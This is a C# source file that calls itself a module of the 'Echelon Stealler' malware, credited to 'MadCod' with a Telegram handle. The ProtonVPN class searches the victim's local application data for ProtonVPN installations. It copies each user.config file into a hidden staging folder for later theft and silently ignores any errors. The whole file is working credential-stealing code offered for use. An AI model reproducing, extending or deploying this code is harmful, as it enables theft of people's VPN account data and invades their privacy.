///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Echelon
{
    class ProtonVPN
    {
        public static int count = 0;
        public static void Start(string Echelon_Dir)
        {
            try
            {
                string dir = Help.LocalData;
                if (Directory.Exists(dir + "\\ProtonVPN"))
                {
                    string[] dirs = Directory.GetDirectories(dir + "" +
                        "\\ProtonVPN");
                    Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\");
                    foreach (string d1rs in dirs)
                    {
                        if (d1rs.StartsWith(dir + "\\ProtonVPN" + "\\ProtonVPN.exe"))
                        {
                            string dirName = new DirectoryInfo(d1rs).Name;
                            string[] d1 = Directory.GetDirectories(d1rs);
                            Directory.CreateDirectory(Echelon_Dir + "\\Vpn\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name);
                            File.Copy(d1[0] + "\\user.config", Echelon_Dir + "\\Vpn\\ProtonVPN\\" + dirName + "\\" + new DirectoryInfo(d1[0]).Name + "\\user.config");
                            count++;
                        }
                    }
                }
            }
            catch  {}

        }
    }
}
